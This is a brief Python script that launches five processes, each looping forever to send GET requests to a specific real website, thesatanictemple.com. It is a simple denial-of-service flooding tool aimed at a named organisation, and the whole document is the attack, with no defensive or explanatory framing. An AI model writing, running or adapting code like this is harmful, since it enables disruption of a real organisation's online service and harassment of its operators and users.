import multiprocessing
import requests

def flood():
  while True:
    requests.get('https://thesatanictemple.com/')

for i in range(5):
  multiprocessing.Process(target=flood).start()
  
  
